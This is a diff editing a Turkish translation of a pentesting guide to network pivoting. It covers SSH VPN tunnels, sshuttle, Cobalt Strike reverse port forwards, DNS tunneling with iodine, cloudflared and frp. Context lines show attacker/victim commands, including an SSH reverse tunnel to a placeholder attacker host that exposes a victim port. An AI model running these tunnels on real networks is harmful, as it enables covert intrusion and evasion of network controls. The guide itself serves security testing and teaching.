@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tüneli
 
-Her iki cihazda da **root erişimine ihtiyacınız var** (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
+Her iki cihazda da **root erişimine** ihtiyacınız var (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırmasının root girişine izin vermesi gerekiyor:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Sunucu tarafında yönlendirmeyi etkinleştir.
+Sunucu tarafında yönlendirmeyi etkinleştirin
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Güvenlik – Terrapin Saldırısı (CVE-2023-48795)**
-> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını değiştirmesine ve **herhangi bir yönlendirilmiş kanala** veri enjekte etmesine olanak tanıyabilir ( `-L`, `-R`, `-D` ). Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın. citeturn4search0
+> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını bozmasına ve **herhangi bir yönlendirilmiş kanala** ( `-L`, `-R`, `-D` ) veri enjekte etmesine olanak tanıyabilir. Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın.
 
 ## SSHUTTLE
 
-Bir ana bilgisayar üzerinden **ssh** ile **alt ağ**'a giden tüm **trafik** için **tünel** oluşturabilirsiniz.\
-Örneğin, 10.10.10.0/24'e giden tüm trafiği yönlendirmek
+Bir ana bilgisayar üzerinden **ssh** ile tüm **trafik**i bir **alt ağa** **tünelleme** yapabilirsiniz.\
+Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -149,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
+> Bu durumda, **port beacon ana bilgisayarında açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -157,7 +157,7 @@ rportfwd stop [bind port]
 Not edilmesi gerekenler:
 
 - Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
-- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
+- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları da dahil.
 - Yüksek portlarda ters port yönlendirmeleri oluşturmak için **yönetici ayrıcalıkları gerekmez**.
 
 ### rPort2Port yerel
@@ -324,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Konsol PuTTY versiyonuna benzer (seçenekler bir ssh istemcisine çok benzer).
+Konsol PuTTY versiyonu gibidir (seçenekler bir ssh istemcisine çok benzer).
 
 Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
 ```bash
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
+Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel olarak bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
 Örneğin, 443 portunu yönlendirin.
 ```
 Username Alice
@@ -396,14 +396,14 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
+Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
 
 Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## DNS Tünelleme
+## DNS Tunneling
 
 ### Iodine
 
@@ -415,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
+Tünel çok yavaş olacak. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -518,7 +518,7 @@ _Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._
 #### HTTP çağrılarını dinleme
 
 _XSS, SSRF, SSTI ... için faydalıdır._\
-stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.
+Stdout'tan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.
 
 #### Dahili HTTP hizmetini tünelleme
 ```bash
@@ -574,11 +574,11 @@ Bağlayıcıyı başlatın:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Çünkü tüm trafik **443 üzerinden dışa çıkıyor**, Cloudflared tünelleri, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İlgili binary'nin genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın. citeturn1search0
+Çünkü tüm trafik ana bilgisayardan **443 üzerinden çıkış yapar**, Cloudflared tüneller, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İlgili ikilinin genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın.
 
 ## FRP (Hızlı Ters Proxy)
 
-[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak işlev görebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir binary gerekmiyor.
+[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak işlev görebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir ikili gerekmemektedir.
 
 ### Klasik ters TCP tüneli
 ```bash
@@ -608,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Yukarıdaki komut, kurbanın portunu **8080** **attacker_ip:9000** olarak yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir. citeturn2search1
+Yukarıdaki komut, kurbanın **8080** portunu **attacker_ip:9000** olarak yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir.
 
 ## Kontrol edilecek diğer araçlar
 
